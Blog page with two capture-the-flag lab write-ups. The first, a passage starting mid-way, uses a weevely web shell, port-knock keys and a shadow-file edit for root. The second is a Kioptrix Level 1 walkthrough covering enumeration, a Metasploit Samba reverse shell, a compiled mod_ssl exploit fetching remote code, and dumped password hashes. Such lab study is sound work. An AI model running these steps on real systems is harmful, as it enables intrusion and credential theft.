<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/var/www# weevely http://192.168.80.142/c.php 1234</span></code></pre></td></tr></table></div></figure>


<p>Note that there exists also a trivial solution, because users can upload php
shell to home directory, which can be invoked without any restriction.</p>

<p>If we read the discussion on web server, someone is asking about port knocking.
We download the data to our server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@:/etc/knockknock.d/profiles/alamo $
</span><span class='line'>
</span><span class='line'>root@kali32:~# find .knockknock/
</span><span class='line'>.knockknock/
</span><span class='line'>.knockknock/192.168.80.142
</span><span class='line'>.knockknock/192.168.80.142/config
</span><span class='line'>.knockknock/192.168.80.142/counter
</span><span class='line'>.knockknock/192.168.80.142/mac.key
</span><span class='line'>.knockknock/192.168.80.142/cipher.key</span></code></pre></td></tr></table></div></figure>


<p>From the vulnerable server, we download and use knockknock too:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.knockknock# knockknock -p 22 192.168.80.142
</span><span class='line'>*** Success: knock sent.
</span><span class='line'>root@kali32:~/.knockknock# ssh alamo@192.168.80.142
</span><span class='line'>
</span><span class='line'>The authenticity of host '192.168.80.142 (192.168.80.142)' can't be established.
</span><span class='line'>RSA key fingerprint is 03:73:de:c7:17:96:0b:bb:8c:8e:c7:87:9b:5b:d5:c9.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)?</span></code></pre></td></tr></table></div></figure>


<p>We log in as alamo / Ih@cK3dM1cR05oF7.</p>

<p>Because nobody has higher privileges for sudo except www-data, we use the web
account to obtain root privileges.
One way of doing this is to change using chown /etc/shadow file permission
to www-data, move to /tmp and change the root hash to a know one (e.g.
alamo&rsquo;s). Then we move the shadow file back.</p>

<p>In the end we log in as root with Ih@cK3dM1cR05oF7 password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># uid=0(root) gid=0(root) groups=0(root)</span></code></pre></td></tr></table></div></figure>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/05/10/kioptrix-level-1/">Kioptrix: Level 1</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-05-10T13:34:07+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:34 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Kioptrix: Level 1 (#1)</a></p>

<p>Nmap output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE     VERSION
</span><span class='line'>22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
</span><span class='line'>80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
</span><span class='line'>111/tcp  open  rpcbind     2 (RPC #100000)
</span><span class='line'>139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
</span><span class='line'>443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
</span><span class='line'>1024/tcp open  status      1 (RPC #100024)</span></code></pre></td></tr></table></div></figure>


<p>Enumeration of Samba:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb# nmblookup -A 192.168.0.26
</span><span class='line'>Looking up status of 192.168.0.26
</span><span class='line'>        KIOPTRIX        &lt;00> -         B &lt;ACTIVE> 
</span><span class='line'>        KIOPTRIX        &lt;03> -         B &lt;ACTIVE> 
</span><span class='line'>        KIOPTRIX        &lt;20> -         B &lt;ACTIVE> 
</span><span class='line'>        ..__MSBROWSE__. &lt;01> - &lt;GROUP> B &lt;ACTIVE> 
</span><span class='line'>        MYGROUP         &lt;00> - &lt;GROUP> B &lt;ACTIVE> 
</span><span class='line'>        MYGROUP         &lt;1d> -         B &lt;ACTIVE> 
</span><span class='line'>        MYGROUP         &lt;1e> - &lt;GROUP> B &lt;ACTIVE> 
</span><span class='line'>
</span><span class='line'>        MAC Address = 00-00-00-00-00-00
</span><span class='line'>
</span><span class='line'>root@kali32:/usr/share/exploitdb# smbclient -L\\ -I 192.168.0.26
</span><span class='line'>Enter root's password: 
</span><span class='line'>Anonymous login successful
</span><span class='line'>Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
</span><span class='line'>
</span><span class='line'>        Sharename       Type      Comment
</span><span class='line'>        ---------       ----      -------
</span><span class='line'>        IPC$            IPC       IPC Service (Samba Server)
</span><span class='line'>        ADMIN$          IPC       IPC Service (Samba Server)
</span><span class='line'>Anonymous login successful
</span><span class='line'>Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
</span><span class='line'>
</span><span class='line'>        Server               Comment
</span><span class='line'>        ---------            -------
</span><span class='line'>        KIOPTRIX             Samba Server
</span><span class='line'>
</span><span class='line'>        Workgroup            Master
</span><span class='line'>        ---------            -------
</span><span class='line'>        MYGROUP              KIOPTRIX</span></code></pre></td></tr></table></div></figure>


<p>The service is running with the root privileges and we can use exploit in Metasploit to obtain root account:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf > use exploit/linux/samba/trans2open
</span><span class='line'>msf exploit(trans2open) > setg RHOST 192.168.80.141
</span><span class='line'>RHOST => 192.168.80.141
</span><span class='line'>msf exploit(trans2open) > exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on 192.168.80.137:4444
</span><span class='line'>[*] Trying return address 0xbffffdfc...
</span><span class='line'>[*] Trying return address 0xbffffcfc...
</span><span class='line'>[*] Trying return address 0xbffffbfc...
</span><span class='line'>[*] Trying return address 0xbffffafc...
</span><span class='line'>[*] Command shell session 1 opened (192.168.80.137:4444 -> 192.168.80.141:1026) at 2015-04-27 06:43:53 +0200</span></code></pre></td></tr></table></div></figure>


<p>Because Apache is vulnerable, there is another solution. Nikto reports something interesting:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.</span></code></pre></td></tr></table></div></figure>


<p>Web server signature:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span></code></pre></td></tr></table></div></figure>


<p>In exploitdb we find:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Apache OpenSSL - Remote Exploit (Multiple Targets) (OpenFuckV2.c) | /linux/remote/764.c</span></code></pre></td></tr></table></div></figure>


<p>Because the exploit is pretty old, we need to update it with these <a href="https://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/">steps</a>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;openssl/rc4.h>
</span><span class='line'>#include &lt;openssl/md5.h>
</span><span class='line'>...
</span><span class='line'>http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
</span><span class='line'>...
</span><span class='line'># gcc -o OpenFuck 764.c -lcrypto</span></code></pre></td></tr></table></div></figure>


<p>Finally we run the exploit and cat /etc/shadow with the root privileges.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/shadow
</span><span class='line'>root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::
</span><span class='line'>bin:*:14513:0:99999:7:::
</span><span class='line'>daemon:*:14513:0:99999:7:::
</span><span class='line'>adm:*:14513:0:99999:7:::
</span><span class='line'>lp:*:14513:0:99999:7:::
</span><span class='line'>sync:*:14513:0:99999:7:::
</span><span class='line'>shutdown:*:14513:0:99999:7:::
</span><span class='line'>halt:*:14513:0:99999:7:::
</span><span class='line'>mail:*:14513:0:99999:7:::
</span><span class='line'>news:*:14513:0:99999:7:::
</span><span class='line'>uucp:*:14513:0:99999:7:::
</span><span class='line'>operator:*:14513:0:99999:7:::
</span><span class='line'>games:*:14513:0:99999:7:::
</span><span class='line'>gopher:*:14513:0:99999:7:::
</span><span class='line'>ftp:*:14513:0:99999:7:::
</span><span class='line'>nobody:*:14513:0:99999:7:::
</span><span class='line'>mailnull:!!:14513:0:99999:7:::
</span><span class='line'>rpm:!!:14513:0:99999:7:::
</span><span class='line'>xfs:!!:14513:0:99999:7:::
</span><span class='line'>rpc:!!:14513:0:99999:7:::
</span><span class='line'>rpcuser:!!:14513:0:99999:7:::
</span><span class='line'>nfsnobody:!!:14513:0:99999:7:::
</span><span class='line'>nscd:!!:14513:0:99999:7:::
</span><span class='line'>ident:!!:14513:0:99999:7:::
</span><span class='line'>radvd:!!:14513:0:99999:7:::
</span><span class='line'>postgres:!!:14513:0:99999:7:::
</span><span class='line'>apache:!!:14513:0:99999:7:::
</span><span class='line'>squid:!!:14513:0:99999:7:::
</span><span class='line'>pcap:!!:14513:0:99999:7:::
</span><span class='line'>john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::
</span><span class='line'>harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::</span></code></pre></td></tr></table></div></figure>

</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/posts/10">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/posts/8">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    




  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - Norbert Szetei -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
